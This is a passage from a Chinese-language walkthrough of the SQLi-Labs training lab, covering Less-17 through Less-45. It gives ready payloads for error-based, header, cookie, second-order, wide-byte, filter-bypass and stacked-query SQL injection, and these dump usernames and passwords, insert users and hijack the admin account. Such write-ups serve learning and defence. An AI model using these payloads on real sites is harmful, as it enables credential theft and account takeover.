class="string">&#x27;5.5.54-log1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190720212316599.png" alt="在这里插入图片描述"><br>这题我采用extractvalue报错，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</span><br><span class="line">回显：XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br><span class="line"></span><br><span class="line">User Name: admin</span><br><span class="line">New Password : 1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e))#</span><br><span class="line">回显：XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br><span class="line"></span><br><span class="line">User Name: admin</span><br><span class="line">New Password : 1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e))#</span><br><span class="line">回显：XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>
<p>接下来，当想要注出user表中的数据时，会报错：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>，因为在同一语句中，不能先select出同一表中的某些值，再update这个表。</p>
<p>所以要通过子查询，使select的表更换一个名称。<br>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1&#x27; and extractvalue(1,concat(0x7e,( select * from ( select group_concat(username,password) from users )a),0x7e))#</span><br><span class="line">回显：XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br><span class="line"></span><br><span class="line">发现报错的信息字数有限，因此想要获得全部数据的化可以通过limit语句一条条的读:</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#x27;:&#x27;,username,password) from users limit 0,1)a),0x7e))#</span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>进入页面发现会显示<code>Your IP ADDRESS is: xxx.xxx.xxx.xxx</code>，再根据名字判断应该是HTTP首部注入，注入的字段可能是X-Forward-For之类的地方，但登陆后会回显User-Agent的内容，这里是通过User-Agent进行注入。</p>
<p>同样是报错注入：<br>先尝试：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190721000838862.png" alt="在这里插入图片描述"><br>由报错信息可以推测后台Insert语句<code>····VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code></p>
<p>因此构造payload：<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190720235005723.png" alt="在这里插入图片描述"><br>最终payload:(通过改变limit语句逐条注出数据)<br><code>1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190720235138536.png" alt="在这里插入图片描述"></p>
<br>

<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>同样登陆后回显Referer的内容，应该是通过http首部的Referer字段进行注入。</p>
<p>先判断后台Insert语句：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190721000622353.png" alt="在这里插入图片描述">大致为：<code>···VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)</code></p>
<p>于是payload:<br><code>1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1),&#39;&#39;)#</code><br><br></p>
<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>同样是http首部注入，这里是通过Cookie注入，大体流程和前面差不多。</p>
<p>payload:<br><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<p>设置Cookie的值为此即可<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190721002907147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>这一关和less-20的区别就是对Cookie的uname进行了一下base64的编码，同时用<code>(&#39;&#39;)</code>进行的闭合。</p>
<p>所以payload：<br><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<p>base64一下得到:<br><code>uname=MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code><br>将Cookie设为base64后的payload<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190721004327173.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h4><p>与less-21的区别是这里用了<code>&quot;</code>进行闭合，其他都一样。</p>
<p>payload:<br><code>uname=MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKiBmcm9tICggc2VsZWN0IGNvbmNhdF93cygnOicsdXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgbGltaXQgMCwxKWEpLDB4N2UpLDEpIw==</code></p>
<br>

<h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>单引号闭合且过滤了注释符<code>#</code>和<code>--</code></p>
<p>因此使用union注入时，要构造sql语句闭合前后的单引号。</p>
<p>payload:（注意最后有个单引号用来闭合）<br><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)&#39;</code></p>
<br>

<h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>根据名字，是一道二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入。</p>
<p>那就进行代码审计，整个代码逻辑比较简单：注册 &#x3D;&gt; 登陆（登陆时login.php会设置Session）&#x3D;&gt; 登陆后可以修改密码</p>
<p>重点关注一下操作数据库的部分，发现只有一个地方的变量在拼接到sql语句中时没有用<code>mysql_real_escape_string()</code>函数进行过滤，在pass_change.php中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	<span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	<span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">		<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即上述代码中的<code>$username</code>在用Update语句进行修改密码时，直接从Session中获取了，没有进行任何过滤。</p>
<p>那么我们再来看看整个<code>$_SESSION[&quot;username&quot;]</code>是如何定义的，在login.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">	<span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">sqllogin</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>可以看到<code>$_SESSION[&quot;username&quot;]</code>是在登陆成功时直接从数据库中取出用户名，没有进行过滤，而这个用户名我们在注册新用户的时候是可控的，这样就找到了可控变量，注入思路也就清楚了0。<br>也就是说虽然在注册的时候构造的payload被过滤了没有办法注入，但是依旧会存到数据库里，当你直接取出并拼接到另一个sql语句时就造成了二次注入。</p>
<p>注入过程：</p>
<p>注册一个用户名为<code>admin&#39;#</code>的用户，并登陆。</p>
<p>这样在修改密码时，拼接过后的Update语句就为：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39; admin&#39;# &#39; and password=&#39;$curr_pass&#39;</code></p>
<p>也就可以修改admin用户的密码了。</p>
<br>

<h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以采用双写绕过。</p>
<p>payload:（注意<code>information</code>和<code>password</code>里也有<code>or</code>，需要双写）</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
<p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
<h4 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h4><p>过滤和绕过方式同less-25，区别是不需要单引号闭合了。</p>
<p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
<h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>过滤了<code>or,and,-,#,&amp;&amp;,空格、内联注释符(/**/)</code></p>
<ul>
<li>本来<code>/**/</code>可以用来绕过空格，但这里被过滤了，所以用<code>%a0</code>绕过</li>
<li><code>or</code>和<code>and</code>依旧用双写绕过，</li>
<li>所有注释符都被过滤了，所以考虑闭合单引号而不是注释</li>
</ul>
<p>payload:<br><code>?id=0&#39;%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),&#39;3</code><br><br></p>
<h4 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h4><p>和上题一样，只不过是用<code>(&#39;$id&#39;)闭合</code></p>
<p>payload:<br><code>?id=0&#39;)%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>在前面的基础上，少过滤了<code>or</code>和<code>and</code>，多过滤了<code>union或UNION</code>和<code>select或UNION</code>,这里<code>union</code>可以用双写或大小写绕过，而<code>select</code>只能用大小写绕过，应该是过滤时使用了全局匹配。</p>
<p>payload:<br><code>?id=0&#39;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&#39;3</code><br><br></p>
<h4 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h4><p>双引号闭合，其他和less-27一样。</p>
<p><code>?id=0&quot;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&quot;3</code><br><br></p>
<h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p><code>(&#39;$id&#39;)</code>闭合，其他和less-27一样。</p>
<p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h4><p>和less-28一模一样…</p>
<p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
<h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>Less 29 - Less 31这三关实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好。<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762961.html">MySQL注入天书</a></p>
<p>重点：对于<code>index.php?id=1&amp;id=2</code>该如何解析呢？实际上apache（php）解析最后一个参数，即显示id&#x3D;2的内容，而Tomcat（jsp）解析第一个参数，即显示id&#x3D;1的内容</p>
<p>整个逻辑大概就是，获取url中查询的部分，第一个<code>id</code>的值经过<code>java_implimentation()</code>处理看是否符合<code>whitelist()</code>函数的过滤要求，若不符合就检测出攻击，否则就把第二个<code>id</code>的值拼接到sql语句中进行查询。</p>
<p>那我们分别看看这两个函数：</p>
<ul>
<li><p><code>whitelist()</code>比较简单，就是要求传入的参数必须是一位以上的数字</p>
</li>
<li><p><code>java_implimentation()</code>则将传入的参数以<code>&amp;</code>为分隔符分为两部分，然后进行遍历，若前两个字符为<code>id</code>则返回后面3到30个字符。</p>
</li>
</ul>
<p>因此构造payload：<br><code>?id=123&amp;id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>同上，不过是双引号闭合。</p>
<p>payload:<br><code>?id=123&amp;id=-1&quot; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>同上，不过是<code>(&quot;$id&quot;)</code>闭合。</p>
<p>payload:<br><code>?id=123&amp;id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>这一关将payload中的单引号前面加上了<code>\</code>进行过滤，想到宽字节注入，即利用gbk编码<code>%df</code>+<code>%5c(\)</code> 组合出了一个 <code>運</code> 字。</p>
<p>注意，这里除了闭合的时候需要考虑绕过单引号，在注入出列名的时候，也需要用到单引号，但这里就不能用<code>%df</code>绕过了，如下面payload中的表名<code>users</code>：</p>
<p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
<p>这里可以用16进制绕过，即用<code>user</code>的16进制<code>0x7573657273</code>代替它，表名为16进制时不需要再用引号了。</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3--+</code></p>
<p><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
<br>

<h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>与less-32一样…</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16&#x2F;utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: 1�&#x27; or 1=1#</span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>GET型宽字解注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
<p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
<h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>好像和less-32一样..</p>
<p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
<br>

<h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>好像和less-34一样…</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">万能密码：</span><br><span class="line">Username: 1�&#x27; or 1=1#</span><br><span class="line">Password: 任意</span><br></pre></td></tr></table></figure>

<br>

<h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>堆叠注入，可以执行多条语句，用分号间隔，可参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762905.html">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
<p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p>
<p>如执行如下payload：<br><code>?id=1&#39;;create table Lethe like users--+</code><br>执行完后页面没有变，但是查询表时可以发现多出了<code>lethe</code>表：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190724211633834.png" alt="在这里插入图片描述"></p>
<p>再将这个表删除：<code>?id=1&#39;;drop table Lethe--+</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190724211832450.png" alt="在这里插入图片描述"><br>发现<code>Lethe</code>表已被删除。</p>
<p>同样，我也可以在它的<code>user</code>表中插入我们自己的一条信息：<br><code>?id=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h4><p>和less-38一样，只不过这里是数字型，无需闭合。</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h4><p>和前面两关的区别是这里用<code>(&#39;$id&#39;)</code>闭合</p>
<p><code>?id=1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><p>和less-39一样，<code>?id=1</code>和<code>?id=2-1</code>返回相同结果，数字型注入。</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
<h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>进入页面是一个登陆窗口，发现注册不了，提示要我们<code>hack</code>掉它，根据前面，判断应该是用堆叠注入插入一个用户到数据库中，来进行登陆。</p>
<p>但这里对Usernmae进行了过滤，因此利用Password来进行堆叠注入。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1&#x27;;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;Lethe&#x27;,&#x27;Lethe&#x27;)#</span><br></pre></td></tr></table></figure>

<p>先利用payload尝试登陆，虽然显示登陆失败，但实际上堆叠注入的语句已经执行，然后再用账户密码均为<code>Lethe</code>的账户进行登陆，发现可以登陆成功。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190724215904736.png" alt="在这里插入图片描述"></p>
<p>如果还希望越权的话，原理参考<strong>less-24</strong>，构造<code>1&#39;;insert into users(id,username,password) values(&quot;25&quot;,&quot;admin&#39;#&quot;,&quot;123&quot;)#</code>，这样就插入可用户名为<code>admin&#39;#</code>，密码为<code>123</code>的用户，登陆此账号：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190724220536354.png" alt="在这里插入图片描述"><br>然后用此账号进行修改密码，实际上修改了用户<code>admin</code>的密码。<br><br></p>
<h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>与less-42一样，区别是这里用<code>(&#39;$password&#39;)</code>闭合。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1&#x27;);insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;Lethe&#x27;,&#x27;Lethe&#x27;)#</span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>好像和less-42一样…</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1&#x27;;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;Lethe&#x27;,&#x27;Lethe&#x27;)#</span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>好像和less-43一样…</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1&#x27;);insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;Lethe&#x27;,&#x27;Lethe&#x27;)#</span><br></pre></td></tr></table></figure>
<br>

